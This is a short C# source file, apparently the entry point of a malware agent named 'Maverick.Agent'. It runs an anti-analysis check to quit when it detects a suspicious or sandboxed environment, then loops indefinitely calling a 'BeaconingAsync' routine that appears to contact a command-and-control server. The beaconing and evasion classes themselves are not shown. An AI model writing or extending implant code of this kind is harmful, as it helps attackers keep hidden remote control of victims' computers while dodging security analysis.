using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Maverick.Agent
{
    internal class Program
    {
        public static void Main()
        {
            if (AntiAnalysisVietNam.IsSuspiciousEnvironment())
            {
                return;
            }
            try
            {
                if(AntiAnalysisVietNam.IsSuspiciousEnvironment())
                {
                    return;
                }
                //
            }
            catch (Exception)
            {
            }
            int num = 0;
            while(Program.isConnected)
            {
                Thread.Sleep(2000);
                num++;
                if (num >= 30)
                {
                    if (!AntiAnalysisVietNam.ShouldContinueExecution())
                    {
                        isConnected = false;
                    }
                    System.Threading.Thread.Sleep(10000); //nghi ngoi
                    num = 0;
                }
                //_ = Task.Run(async () =>
                //{
                //    await CommandSender.BeaconingAsync();
                //});

                CommandSender.BeaconingAsync().Wait();

            }

        }
        
        private static bool isConnected = true;
    }
}
